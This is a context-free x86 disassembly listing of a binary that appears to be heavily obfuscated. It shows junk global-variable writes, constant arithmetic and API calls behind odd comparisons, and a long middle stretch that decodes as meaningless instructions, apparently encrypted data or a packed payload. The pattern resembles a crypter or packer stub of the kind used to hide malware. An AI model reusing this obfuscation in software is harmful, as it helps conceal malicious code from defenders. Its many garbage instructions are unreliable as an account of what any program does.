  41ca7b:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41ca85:	cmp    DWORD PTR ds:0x428445,0x0
  41ca8c:	mov    DWORD PTR ds:0x428351,edi
  41ca92:	mov    DWORD PTR ds:0x42841d,edx
  41ca98:	jmp    0x41cafc
  41ca9d:	mov    DWORD PTR ds:0x428429,edx
  41caa3:	mov    DWORD PTR ds:0x4284f9,ebx
  41caa9:	cmp    DWORD PTR ds:0x428445,0x0
  41cab0:	jbe    0x41cad5
  41cab6:	push   DWORD PTR [ebp-0x1c]
  41cab9:	call   DWORD PTR ds:0x42e128
  41cabf:	sub    DWORD PTR ds:0x428501,edi
  41cac5:	xor    ecx,ecx
  41cac7:	add    ecx,DWORD PTR ds:0x428591
  41cacd:	mov    ecx,DWORD PTR [ecx]
  41cacf:	adc    DWORD PTR ds:0x42845d,ecx
  41cad5:	and    ecx,DWORD PTR ds:0x428551
  41cadb:	sub    ecx,ecx
  41cadd:	xor    ecx,ecx
  41cadf:	or     ecx,DWORD PTR ds:0x428559
  41cae5:	and    ecx,DWORD PTR ds:0x428461
  41caeb:	mov    DWORD PTR ds:0x428559,ecx
  41caf1:	adc    ecx,DWORD PTR ds:0x428409
  41caf7:	or     eax,0x53d3
  41cafc:	mov    DWORD PTR [ebp-0xc4],0x6236
  41cb06:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41cb0d:	jmp    0x41cef4
  41cb12:	pop    ebx
  41cb13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb14:	jmp    0x31aa:0x7b9c3cd8
  41cb1b:	add    al,0x9a
  41cb1d:	jecxz  0x41caf5
  41cb1f:	lds    edi,FWORD PTR [esp+eiz*4-0x413fb615]
  41cb26:	dec    edx
  41cb27:	les    edi,FWORD PTR [esi-0x51240742]
  41cb2d:	xchg   ecx,eax
  41cb2e:	outs   dx,BYTE PTR ds:[esi]
  41cb2f:	sti    
  41cb30:	into   
  41cb31:	neg    BYTE PTR [edi-0x60]
  41cb34:	mov    cl,0x38
  41cb36:	mov    eax,0x6aa996e7
  41cb3b:	ins    BYTE PTR es:[edi],dx
  41cb3c:	icebp  
  41cb3d:	das    
  41cb3e:	shl    DWORD PTR [esi+0x408780f4],1
  41cb44:	mov    DWORD PTR [esi],edi
  41cb46:	and    DWORD PTR [eax-0x4c3b68c5],ebx
  41cb4c:	aaa    
  41cb4d:	jo     0x41cadf
  41cb4f:	mov    al,0xd9
  41cb51:	test   al,0x15
  41cb53:	fbstp  TBYTE PTR [edi]
  41cb55:	std    
  41cb56:	inc    ecx
  41cb57:	das    
  41cb58:	pop    ss
  41cb59:	mov    DWORD PTR [ebp+0x6c],ecx
  41cb5c:	mov    BYTE PTR [eax+ebp*8-0x66],bh
  41cb60:	mov    WORD PTR [ebx+0x38],cs
  41cb63:	and    DWORD PTR [esi+0x8],0x19
  41cb67:	dec    esp
  41cb68:	mov    bh,0x44
  41cb6a:	push   ebx
  41cb6b:	out    dx,al
  41cb6c:	pop    es
  41cb6d:	mov    dh,0x32
  41cb6f:	mov    esi,0xd65b8
  41cb74:	fwait
  41cb75:	int3   
  41cb76:	jbe    0x41cbce
  41cb78:	sahf   
  41cb79:	mov    ds:0xd56ca517,eax
  41cb7e:	xchg   dl,ah
  41cb80:	push   ss
  41cb81:	cdq    
  41cb82:	in     al,0x2c
  41cb84:	stos   DWORD PTR es:[edi],eax
  41cb85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb86:	out    dx,al
  41cb87:	push   cs
  41cb88:	jg     0x41cb3b
  41cb8a:	mov    cl,0x75
  41cb8c:	sub    dh,BYTE PTR [eax]
  41cb8e:	lods   eax,DWORD PTR ds:[esi]
  41cb8f:	jae    0x41cbc0
  41cb91:	push   es
  41cb92:	rol    BYTE PTR [ebx],0x32
  41cb95:	and    bl,al
  41cb97:	daa    
  41cb98:	pop    ds
  41cb99:	mov    edx,0x3f294464
  41cb9e:	mul    DWORD PTR [edi-0x2]
  41cba1:	or     al,0x93
  41cba3:	cmp    al,0x8d
  41cba5:	fstp   DWORD PTR [eax-0x48]
  41cba8:	stos   BYTE PTR es:[edi],al
  41cba9:	fld    DWORD PTR [ebx-0x718211f5]
  41cbaf:	or     dh,dh
  41cbb1:	mov    ch,0xf2
  41cbb3:	cli    
  41cbb4:	jle    0x41cc1b
  41cbb6:	(bad)  
  41cbb7:	ins    DWORD PTR es:[edi],dx
  41cbb8:	mov    ch,0xf7
  41cbba:	iret   
  41cbbb:	loop   0x41cb4a
  41cbbd:	cmp    eax,0x91bac6ce
  41cbc2:	sub    al,0xe5
  41cbc4:	pop    ecx
  41cbc5:	loope  0x41cbb7
  41cbc7:	push   edx
  41cbc8:	popf   
  41cbc9:	fld    QWORD PTR [esi+eax*1-0x3a]
  41cbcd:	repnz mov al,ds:0x2eaa8ead
  41cbd3:	cld    
  41cbd4:	mov    bh,0x66
  41cbd6:	pop    esp
  41cbd7:	jne    0x41cb73
  41cbd9:	and    al,BYTE PTR [edi]
  41cbdb:	sbb    al,0x9b
  41cbdd:	notrack call DWORD PTR [esi-0x66]
  41cbe1:	ja     0x41cb74
  41cbe3:	inc    esi
  41cbe4:	jo     0x41cb8e
  41cbe6:	push   cs
  41cbe7:	cdq    
  41cbe8:	out    0x9b,eax
  41cbea:	add    eax,0x2bb555a1
  41cbef:	xlat   BYTE PTR ds:[ebx]
  41cbf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbf1:	adc    al,0xeb
  41cbf3:	fs loop 0x41cc5c
  41cbf6:	fdiv   DWORD PTR [edi+ebp*1-0x4e7ca40d]
  41cbfd:	cmp    eax,0x9503f3c
  41cc02:	xor    ecx,DWORD PTR [edx]
  41cc04:	cdq    
  41cc05:	scas   al,BYTE PTR es:[edi]
  41cc06:	xchg   esi,eax
  41cc07:	shr    BYTE PTR [ebp-0xdfa18e6],cl
  41cc0d:	cld    
  41cc0e:	jecxz  0x41cbe9
  41cc10:	icebp  
  41cc11:	adc    eax,0x4649345a
  41cc16:	add    BYTE PTR [ebx+0x6],cl
  41cc19:	ins    DWORD PTR es:[edi],dx
  41cc1a:	sti    
  41cc1b:	push   ss
  41cc1c:	xor    DWORD PTR [esi+0x19],eax
  41cc1f:	repnz pop ebx
  41cc21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc22:	pusha  
  41cc23:	jnp    0x41cbc1
  41cc25:	sbb    BYTE PTR [edi+0x77136c12],0xc8
  41cc2c:	mov    eax,0xe2e0706c
  41cc31:	dec    edi
  41cc32:	cli    
  41cc33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc34:	cmp    edi,edi
  41cc36:	out    0xe,eax
  41cc38:	js     0x41cbd7
  41cc3a:	adc    cl,BYTE PTR ds:0xc76a0b66
  41cc40:	and    eax,0xfaf3789d
  41cc45:	adc    al,0x3d
  41cc47:	cmp    eax,0x8de7ff7d
  41cc4c:	stos   BYTE PTR es:[edi],al
  41cc4d:	leave  
  41cc4e:	mov    cl,BYTE PTR [ecx-0x782741a2]
  41cc54:	dec    eax
  41cc55:	(bad)  
  41cc56:	mov    ch,0x40
  41cc58:	mov    edx,0x6042011e
  41cc5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc5e:	mov    ebx,0x38bcfb51
  41cc63:	jns    0x41cbf4
  41cc65:	shl    DWORD PTR [edi+eax*2+0x21],0xbb
  41cc6a:	xor    ebp,0x165227e3
  41cc70:	icebp  
  41cc71:	xchg   edi,eax
  41cc72:	pop    edi
  41cc73:	cmp    esi,eax
  41cc75:	js     0x41cc93
  41cc77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc78:	fisubr WORD PTR [ebx]
  41cc7a:	test   al,0x99
  41cc7c:	shl    DWORD PTR [edi],0x2f
  41cc7f:	test   al,0x92
  41cc81:	cmp    cl,BYTE PTR ds:0xd28d14b2
  41cc87:	mov    ebp,0x2819738f
  41cc8c:	jne    0x41cc7f
  41cc8e:	mov    WORD PTR [eax+0x3374a865],es
  41cc94:	mov    edi,0x4d1d2b5c
  41cc99:	adc    ebx,0x2b06c119
  41cc9f:	mov    edx,0xd04ed3b3
  41cca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cca5:	jl     0x41cce9
  41cca7:	or     eax,0x11c6da33
  41ccac:	mov    ebx,0x64ff09a2
  41ccb1:	in     al,0x9
  41ccb3:	ja     0x41cd11
  41ccb5:	and    eax,0x42b6b0dd
  41ccba:	or     ebx,esp
  41ccbc:	lea    esi,[ebp+0x1d536b73]
  41ccc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccc3:	je     0x41cd0d
  41ccc5:	shr    BYTE PTR [eax+eax*1+0x772e2cd7],cl
  41cccc:	lods   al,BYTE PTR ds:[esi]
  41cccd:	cmp    al,0xb5
  41cccf:	pop    edx
  41ccd0:	xchg   esi,eax
  41ccd1:	into   
  41ccd2:	dec    ecx
  41ccd3:	pop    es
  41ccd4:	repz adc BYTE PTR [edx-0x310bebc3],dl
  41ccdb:	fwait
  41ccdc:	mov    ch,0xfd
  41ccde:	outs   dx,DWORD PTR ds:[esi]
  41ccdf:	pop    ebp
  41cce0:	xchg   esi,eax
  41cce1:	jb     0x41cc64
  41cce3:	mov    dl,0x30
  41cce5:	xchg   esp,eax
  41cce6:	jmp    0x41cd59
  41cce8:	inc    ebx
  41cce9:	dec    eax
  41ccea:	xchg   DWORD PTR [ecx],edx
  41ccec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cced:	jb     0x41cca6
  41ccef:	xor    edi,DWORD PTR [ecx]
  41ccf1:	push   edx
  41ccf2:	retf   
  41ccf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccf4:	push   0xffffffb5
  41ccf6:	das    
  41ccf7:	jns    0x41cd35
  41ccf9:	mov    ds:0xb8fecb9f,al
  41ccfe:	inc    ebp
  41ccff:	arpl   WORD PTR [ecx],cx
  41cd01:	sub    WORD PTR [eax+0x7c],0xe358
  41cd07:	dec    esp
  41cd08:	inc    ecx
  41cd09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd0a:	push   esp
  41cd0b:	mov    bl,0x3c
  41cd0d:	push   esi
  41cd0e:	loope  0x41cced
  41cd10:	jb     0x41cd64
  41cd12:	lahf   
  41cd13:	shr    DWORD PTR [esi],cl
  41cd15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd16:	sub    al,0xc3
  41cd18:	jns    0x41cd51
  41cd1a:	test   dl,dh
  41cd1c:	jp     0x41cd4c
  41cd1e:	aaa    
  41cd1f:	mov    cl,0xae
  41cd21:	cmp    al,0x7a
  41cd23:	fild   WORD PTR [eax+ebx*4+0x2e]
  41cd27:	pop    esi
  41cd28:	push   cs
  41cd29:	sbb    BYTE PTR [esi],dl
  41cd2b:	stos   DWORD PTR es:[edi],eax
  41cd2c:	cmp    DWORD PTR [ebx+0x3e960f2e],edx
  41cd32:	mov    esi,DWORD PTR [edx+0x6ac069a3]
  41cd38:	je     0x41cd9e
  41cd3a:	stos   BYTE PTR es:[edi],al
  41cd3b:	fld    TBYTE PTR [ecx+edi*8-0x47]
  41cd3f:	xor    BYTE PTR ds:0x41c4d276,ah
  41cd45:	sar    ah,0x7b
  41cd48:	das    
  41cd49:	mov    ds:0xd2d60a96,eax
  41cd4e:	imul   ecx,DWORD PTR [edx+0x18],0xffffffc5
  41cd52:	out    dx,al
  41cd53:	jecxz  0x41cd22
  41cd55:	jae    0x41cce4
  41cd57:	sahf   
  41cd58:	fnsave [esi+eiz*1+0xa28070c]
  41cd5f:	or     al,0xa8
  41cd61:	jge    0x41cd1a
  41cd63:	stos   DWORD PTR es:[edi],eax
  41cd64:	xor    BYTE PTR [ecx+0x48c370d],ch
  41cd6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd6b:	clc    
  41cd6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd6d:	out    dx,eax
  41cd6e:	cmp    DWORD PTR [edx-0x445959e6],eax
  41cd74:	fistp  DWORD PTR [ecx+0x19]
  41cd77:	xchg   edi,eax
  41cd78:	inc    esi
  41cd79:	(bad)  
  41cd7a:	ins    BYTE PTR es:[edi],dx
  41cd7b:	fwait
  41cd7c:	dec    ecx
  41cd7d:	inc    esi
  41cd7e:	sub    edx,DWORD PTR [ecx-0x31]
  41cd81:	in     eax,dx
  41cd82:	mov    edi,ss
  41cd84:	loopne 0x41cd48
  41cd86:	fst    QWORD PTR es:[esi+0x42]
  41cd8a:	aad    0xa1
  41cd8c:	rcl    DWORD PTR [ebx],1
  41cd8e:	mov    ecx,0xfb3936d5
  41cd93:	lock push eax
  41cd95:	jecxz  0x41ce0d
  41cd97:	and    esp,esi
  41cd99:	pusha  
  41cd9a:	jno    0x41cd3a
  41cd9c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41cd9e:	jmp    0x62bc:0xed7320c5
  41cda5:	inc    ebp
  41cda6:	jg     0x41ce01
  41cda8:	push   esp
  41cda9:	and    al,0x65
  41cdab:	cmp    ch,bl
  41cdad:	or     BYTE PTR [eax-0x73],ch
  41cdb0:	loope  0x41ce10
  41cdb2:	outs   dx,DWORD PTR ds:[esi]
  41cdb3:	gs fwait
  41cdb5:	daa    
  41cdb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb7:	repz mov bl,BYTE PTR [ebx+0x7a]
  41cdbb:	mov    al,0x22
  41cdbd:	cld    
  41cdbe:	shl    DWORD PTR [edx+0x4cf30c41],cl
  41cdc4:	cs inc esi
  41cdc6:	jb     0x41cdb9
  41cdc8:	push   0xffffffd3
  41cdca:	and    eax,DWORD PTR [edx+0x59]
  41cdcd:	mov    ebx,0x89f10afa
  41cdd2:	rcl    DWORD PTR gs:[edx-0x796ea4f4],0x6e
  41cdda:	inc    ecx
  41cddb:	mov    esp,gs
  41cddd:	push   edx
  41cdde:	aad    0xec
  41cde0:	ret    0xddcd
  41cde3:	sub    al,0x36
  41cde5:	sbb    esi,ebp
  41cde7:	mov    esi,0x5427de08
  41cdec:	jbe    0x41ce20
  41cdee:	addr16 cmc 
  41cdf0:	sub    eax,0x5e993f32
  41cdf5:	sti    
  41cdf6:	and    DWORD PTR [ebp+0x763145f9],ecx
  41cdfc:	sbb    edx,edi
  41cdfe:	add    BYTE PTR [ebx],bl
  41ce00:	hlt    
  41ce01:	imul   edx,DWORD PTR [ecx],0x4fbef161
  41ce07:	frstor [ecx+esi*8+0x7c]
  41ce0b:	call   0x3406:0x940c007c
  41ce12:	fdiv   st(1),st
  41ce14:	ins    DWORD PTR es:[edi],dx
  41ce15:	popa   
  41ce16:	es adc al,0x2d
  41ce19:	(bad)  
  41ce1b:	and    al,BYTE PTR [eax]
  41ce1d:	cmp    BYTE PTR [ebp+0x5f],ah
  41ce20:	xchg   edx,eax
  41ce21:	jne    0x41ce9d
  41ce23:	and    ch,BYTE PTR [edx]
  41ce25:	xor    BYTE PTR [ebx+ebx*4+0x2fc3c44],bh
  41ce2c:	and    eax,0x2ec483d1
  41ce31:	pushf  
  41ce32:	fs dec edx
  41ce34:	mov    ah,0xa0
  41ce36:	mov    ebx,0xc49df859
  41ce3b:	dec    edx
  41ce3c:	jp     0x41ce6a
  41ce3e:	mov    eax,ds:0x4a7ad64d
  41ce43:	(bad)  
  41ce44:	pop    esp
  41ce45:	or     BYTE PTR cs:[ebp-0x5d6da560],bh
  41ce4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce4d:	push   0xf043083e
  41ce52:	cmp    edi,DWORD PTR [edx-0x20]
  41ce55:	push   0x8bd71dc5
  41ce5a:	sar    DWORD PTR [ebx],1
  41ce5c:	mov    ?,WORD PTR [edx+0x29]
  41ce5f:	mov    ebp,0xc736e353
  41ce64:	aaa    
  41ce65:	cdq    
  41ce66:	ror    BYTE PTR [ecx],0x72
  41ce69:	cwde   
  41ce6a:	int    0x19
  41ce6c:	xor    bh,ah
  41ce6e:	dec    ebp
  41ce6f:	jae    0x41ce8f
  41ce71:	or     al,0xa2
  41ce73:	scas   eax,DWORD PTR es:[edi]
  41ce74:	stos   BYTE PTR es:[edi],al
  41ce75:	cmp    al,0x81
  41ce77:	dec    esi
  41ce78:	inc    BYTE PTR [ebx+0xd]
  41ce7b:	fwait
  41ce7c:	packsswb mm0,mm5
  41ce7f:	inc    edx
  41ce80:	sub    BYTE PTR [edx+0x289807df],al
  41ce86:	fneni(8087 only) 
  41ce88:	bndldx (bad),[esi]
  41ce8b:	jne    0x41ce9a
  41ce8d:	fs mov bl,0x78
  41ce90:	or     dh,BYTE PTR [ebp+0x6f591688]
  41ce96:	add    BYTE PTR [eax],ah
  41ce98:	loope  0x41cee6
  41ce9a:	pop    ss
  41ce9b:	or     eax,0xde6c16f5
  41cea0:	in     al,0xe9
  41cea2:	jae    0x41ce4e
  41cea4:	fisttp WORD PTR [edi-0x4a]
  41cea7:	outs   dx,DWORD PTR ds:[esi]
  41cea8:	sbb    bh,ah
  41ceaa:	dec    ebp
  41ceab:	pop    ebp
  41ceac:	lds    ecx,FWORD PTR [ebx+edx*8-0x5]
  41ceb0:	dec    edx
  41ceb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ceb2:	adc    al,0x49
  41ceb4:	data16 int 0xea
  41ceb7:	ja     0x41cf2f
  41ceb9:	xor    ebp,DWORD PTR [edi-0x74]
  41cebc:	jp     0x41cea0
  41cebe:	dec    eax
  41cebf:	pop    eax
  41cec0:	inc    edi
  41cec1:	mov    dl,0x36
  41cec3:	pop    esi
  41cec4:	inc    edx
  41cec5:	sbb    esi,DWORD PTR [ebp+0x6d]
  41cec8:	sbb    eax,0x3d5fba8d
  41cecd:	int3   
  41cece:	mov    WORD PTR [esi+eiz*4],fs
  41ced1:	inc    eax
  41ced2:	sahf   
  41ced3:	popf   
  41ced4:	out    dx,al
  41ced5:	jae    0x41ce67
  41ced7:	pop    esp
  41ced8:	mov    ebx,edx
  41ceda:	cmp    DWORD PTR [esi-0x589fba9d],eax
  41cee0:	xor    dl,BYTE PTR [eax+0x16]
  41cee3:	xor    bh,bl
  41cee5:	les    esi,FWORD PTR [eax]
  41cee7:	xor    eax,esp
  41cee9:	xchg   esi,ebp
  41ceeb:	fmul   QWORD PTR [ebx]
  41ceed:	pop    es
  41ceee:	pop    edi
  41ceef:	dec    edx
  41cef0:	mov    dl,0x53
  41cef2:	pop    esp
  41cef3:	in     al,dx
  41cef4:	mov    DWORD PTR [ebp-0x128],0x7537
  41cefe:	xor    DWORD PTR ds:0x428479,edx
  41cf04:	mov    DWORD PTR [ebp-0x114],0x6985
  41cf0e:	and    DWORD PTR ds:0x4284e9,ebx
  41cf14:	mov    DWORD PTR [ebp-0x14],0x5627
  41cf1b:	or     DWORD PTR ds:0x428451,0x428555
  41cf25:	mov    DWORD PTR [ebp-0x64],0x72e7
  41cf2c:	mov    eax,DWORD PTR [ebp-0x14]
  41cf2f:	and    DWORD PTR ds:0x428551,ebx
  41cf35:	add    eax,DWORD PTR [ebp-0x64]
  41cf38:	mov    ecx,DWORD PTR [ebp-0x114]
  41cf3e:	sbb    DWORD PTR ds:0x4284d5,0x42833d
  41cf48:	sub    eax,ecx
  41cf4a:	xor    DWORD PTR ds:0x428371,edi
  41cf50:	mov    ecx,DWORD PTR [ebp-0x128]
  41cf56:	imul   eax,ecx
  41cf59:	cmp    DWORD PTR ds:0x428565,0x0
  41cf60:	mov    DWORD PTR ds:0x428501,0x44b
  41cf6a:	mov    ecx,DWORD PTR ds:0x428481
  41cf70:	mov    ecx,DWORD PTR ds:0x42847d
  41cf76:	mov    ecx,0x4ae9
  41cf7b:	jmp    0x41cfe3
  41cf80:	mov    ecx,DWORD PTR ds:0x4284f9
  41cf86:	mov    DWORD PTR ds:0x42834d,0x5810
  41cf90:	cmp    DWORD PTR ds:0x428565,0x0
  41cf97:	ja     0x41cfcd
  41cf9d:	push   0x42855d
  41cfa2:	push   0x16d1
  41cfa7:	push   DWORD PTR [ebp-0x20]
  41cfaa:	push   0x7e78
  41cfaf:	call   DWORD PTR ds:0x42e078
  41cfb5:	mov    ecx,DWORD PTR ds:0x42833d
  41cfbb:	sbb    DWORD PTR ds:0x42857d,ecx
  41cfc1:	sub    DWORD PTR ds:0x42843d,ecx
  41cfc7:	not    DWORD PTR ds:0x4284f9
  41cfcd:	xor    DWORD PTR ds:0x4284f5,edi
  41cfd3:	mov    DWORD PTR ds:0x428435,0x4e0f
  41cfdd:	xor    ecx,DWORD PTR ds:0x428551
  41cfe3:	imul   eax,eax,0xe4e
  41cfe9:	mov    ecx,DWORD PTR [ebp-0x7c]
  41cfec:	or     eax,ecx
  41cfee:	mov    ecx,DWORD PTR [ebp+0x8]
  41cff1:	adc    DWORD PTR ds:0x428571,0xad
  41cffb:	lea    eax,[ecx+eax*1+0x46210209]
  41d002:	add    DWORD PTR ds:0x428449,0x55ef
  41d00c:	push   eax
  41d00d:	call   0x410df4
  41d012:	mov    ecx,eax
  41d014:	cmp    DWORD PTR ds:0x42833d,0x0
  41d01b:	mov    esi,DWORD PTR ds:0x428575
  41d021:	mov    DWORD PTR ds:0x428441,0x25c4
  41d02b:	jmp    0x41d0fd
  41d030:	mov    DWORD PTR ds:0x42846d,0x7eed
  41d03a:	mov    DWORD PTR ds:0x42855d,edx
  41d040:	cmp    DWORD PTR ds:0x42833d,0x0
  41d047:	jbe    0x41d070
  41d04d:	push   0x428371
  41d052:	call   DWORD PTR ds:0x42e2a0
  41d058:	and    esi,esi
  41d05a:	and    esi,DWORD PTR ds:0x4284d9
  41d060:	mov    esi,DWORD PTR ds:0x428511
  41d066:	mov    esi,DWORD PTR [esi]
  41d068:	xor    DWORD PTR ds:0x4284e9,esi
  41d06e:	xor    esi,esi
  41d070:	add    DWORD PTR ds:0x428355,ebx
  41d076:	movzx  esi,BYTE PTR ds:0x428561
  41d07d:	sbb    DWORD PTR ds:0x428465,esi
  41d083:	sbb    DWORD PTR ds:0x428569,0x428419
  41d08d:	or     esi,esi
  41d08f:	cmp    DWORD PTR ds:0x42836d,0x0
  41d096:	mov    DWORD PTR ds:0x4284f1,0x3cb6
  41d0a0:	mov    esi,0x65ca
  41d0a5:	mov    DWORD PTR ds:0x428501,edi
  41d0ab:	jmp    0x41d0fd
  41d0b0:	mov    DWORD PTR ds:0x42855d,edi
  41d0b6:	mov    eax,0x6c7b
  41d0bb:	cmp    DWORD PTR ds:0x42836d,0x0
  41d0c2:	jg     0x41d0eb
  41d0c8:	push   0x1a0a
  41d0cd:	push   DWORD PTR [ebp-0x24]
  41d0d0:	push   DWORD PTR [ebp-0xc]
  41d0d3:	call   DWORD PTR ds:0x42e12c
  41d0d9:	and    DWORD PTR ds:0x42854d,edx
  41d0df:	xor    DWORD PTR ds:0x428359,ebx
  41d0e5:	sub    esi,0x4c5f
  41d0eb:	sbb    DWORD PTR ds:0x428331,0x56b4
  41d0f5:	sbb    esi,esi
  41d0f7:	add    DWORD PTR ds:0x428449,ebx
  41d0fd:	mov    eax,DWORD PTR [ebp-0xc4]
  41d103:	imul   eax,eax,0x21b3
  41d109:	cmp    DWORD PTR ds:0x428355,0x0
  41d110:	mov    esi,0x3999
  41d115:	movzx  esi,BYTE PTR ds:0x428561
  41d11c:	mov    esi,0x5e4b
  41d121:	mov    esi,DWORD PTR ds:0x428339
  41d127:	jmp    0x41d1a8
  41d12c:	mov    DWORD PTR ds:0x4284ed,0x7a2a
  41d136:	not    esi
  41d138:	cmp    DWORD PTR ds:0x428355,0x0
  41d13f:	jb     0x41d183
  41d145:	push   0x5450
  41d14a:	push   0x3c7c
  41d14f:	call   DWORD PTR ds:0x42e07c
  41d155:	mov    esi,DWORD PTR ds:0x428549
  41d15b:	add    esi,DWORD PTR ds:0x42846d
  41d161:	mov    DWORD PTR ds:0x428549,esi
  41d167:	mov    esi,DWORD PTR ds:0x428411
  41d16d:	and    esi,DWORD PTR ds:0x428439
  41d173:	mov    DWORD PTR ds:0x428411,esi
  41d179:	sbb    DWORD PTR ds:0x428481,0x6b94
  41d183:	mov    esi,DWORD PTR ds:0x42844d
  41d189:	add    DWORD PTR ds:0x4284d5,esi
  41d18f:	movzx  esi,WORD PTR ds:0x428449
  41d196:	adc    esi,DWORD PTR ds:0x428365
  41d19c:	mov    DWORD PTR ds:0x428449,esi
  41d1a2:	xor    DWORD PTR ds:0x428339,edi
  41d1a8:	add    eax,DWORD PTR [ebp-0xe4]
  41d1ae:	and    eax,0xd5c
  41d1b3:	sub    eax,0x2e81
  41d1b8:	xor    edx,edx
  41d1ba:	sbb    DWORD PTR ds:0x42835d,ebx
  41d1c0:	mov    esi,0x2f1dc
  41d1c5:	or     DWORD PTR ds:0x428345,0x1bf3
  41d1cf:	div    esi
  41d1d1:	cmp    DWORD PTR ds:0x42845d,0x0
  41d1d8:	mov    DWORD PTR ds:0x428551,0x7c0f
  41d1e2:	mov    DWORD PTR ds:0x428479,0x21cd
  41d1ec:	mov    esi,DWORD PTR ds:0x428331
  41d1f2:	jmp    0x41d24d
  41d1f7:	mov    DWORD PTR ds:0x42857d,0x7012
  41d201:	mov    esi,0x5ebc
  41d206:	cmp    DWORD PTR ds:0x42845d,0x0
  41d20d:	jne    0x41d239
  41d213:	push   0x389e
  41d218:	push   0x768e
  41d21d:	push   0x6d0b
  41d222:	push   0x8403
  41d227:	call   DWORD PTR ds:0x42e130
  41d22d:	sbb    edx,DWORD PTR ds:0x428475
  41d233:	add    edx,0x16c4
  41d239:	movzx  esi,WORD PTR ds:0x428405
  41d240:	adc    DWORD PTR ds:0x4284d5,esi
  41d246:	sub    DWORD PTR ds:0x4284e9,edx
  41d24c:	inc    esi
  41d24d:	xor    eax,0x56ef
  41d252:	add    DWORD PTR ds:0x428561,0x7098
  41d25c:	add    ecx,eax
  41d25e:	cmp    DWORD PTR ds:0x428439,0x0
  41d265:	mov    DWORD PTR ds:0x42835d,0x1f02
  41d26f:	mov    esi,0x4128
  41d274:	mov    esi,DWORD PTR ds:0x4284cd
  41d27a:	jmp    0x41d2f7
  41d27f:	mov    DWORD PTR ds:0x42854d,ebx
  41d285:	movzx  eax,WORD PTR ds:0x42841d
  41d28c:	cmp    DWORD PTR ds:0x428439,0x0
  41d293:	jb     0x41d2d0
  41d299:	push   0x4840
  41d29e:	push   DWORD PTR [ebp-0x14]
  41d2a1:	push   0x75a6
  41d2a6:	push   DWORD PTR [ebp-0xc]
  41d2a9:	push   0x428243
  41d2ae:	push   DWORD PTR [ebp-0x28]
  41d2b1:	call   DWORD PTR ds:0x42e134
  41d2b7:	movzx  esi,BYTE PTR ds:0x428549
  41d2be:	xor    DWORD PTR ds:0x4284e5,esi
  41d2c4:	xor    esi,edx
  41d2c6:	or     DWORD PTR ds:0x428471,0x2eb3
  41d2d0:	xor    DWORD PTR ds:0x42855d,ebx
  41d2d6:	adc    edx,DWORD PTR ds:0x428571
  41d2dc:	add    DWORD PTR ds:0x42834d,0x1b5f
  41d2e6:	mov    esi,DWORD PTR ds:0x428519
  41d2ec:	mov    edx,DWORD PTR ds:0x4285b1
  41d2f2:	sub    edx,esi
  41d2f4:	sub    esi,DWORD PTR [esi+edx*1]
  41d2f7:	mov    DWORD PTR [ebp-0x90],ecx
  41d2fd:	mov    DWORD PTR [ebp-0xe0],0x7a31
  41d307:	mov    DWORD PTR ds:0x42843d,0x52c8
  41d311:	mov    DWORD PTR [ebp-0x44],0x2514
  41d318:	mov    DWORD PTR [ebp-0xdc],0x699c
  41d322:	cmp    DWORD PTR ds:0x4284d9,0x0
  41d329:	mov    DWORD PTR ds:0x428501,0x628e
  41d333:	movzx  ecx,BYTE PTR ds:0x428351
  41d33a:	mov    ecx,DWORD PTR ds:0x428431
  41d340:	jmp    0x41d3bd
  41d345:	mov    DWORD PTR ds:0x42840d,0x21ce
  41d34f:	mov    DWORD PTR ds:0x428369,edi
  41d355:	cmp    DWORD PTR ds:0x4284d9,0x0
  41d35c:	jge    0x41d39a
  41d362:	push   DWORD PTR [ebp-0x20]
  41d365:	push   DWORD PTR [ebp-0xc]
  41d368:	push   DWORD PTR [ebp-0x18]
  41d36b:	call   DWORD PTR ds:0x42e138
  41d371:	mov    ecx,DWORD PTR ds:0x428395
  41d377:	mov    edx,DWORD PTR ds:0x4285b9
  41d37d:	sub    ecx,edx
  41d37f:	sub    ecx,DWORD PTR [ecx+edx*1]
  41d382:	sub    ecx,0x1d69
  41d388:	mov    ecx,DWORD PTR ds:0x4284b5
  41d38e:	mov    edx,DWORD PTR ds:0x4285ad
  41d394:	sub    ecx,edx
  41d396:	imul   ecx,DWORD PTR [ecx+edx*1]
  41d39a:	sbb    DWORD PTR ds:0x4284f1,0x4f1
  41d3a4:	sub    esi,DWORD PTR ds:0x42857d
  41d3aa:	xor    esi,esi
  41d3ac:	add    esi,DWORD PTR ds:0x4283d9
  41d3b2:	mov    edx,DWORD PTR ds:0x42848d
  41d3b8:	sub    edx,esi
  41d3ba:	add    esi,DWORD PTR [esi+edx*1]
  41d3bd:	mov    DWORD PTR [ebp-0xd8],0x1
  41d3c7:	mov    DWORD PTR [ebp-0x24],0x7901
  41d3ce:	mov    esi,DWORD PTR ds:0x4283a5
  41d3d4:	xor    ecx,ecx
  41d3d6:	or     ecx,DWORD PTR ds:0x4283b1
  41d3dc:	sub    esi,ecx
  41d3de:	sub    esi,DWORD PTR [esi+ecx*1]
  41d3e1:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  41d3eb:	mov    DWORD PTR [ebp-0x78],0x37f2
  41d3f2:	add    edx,eax
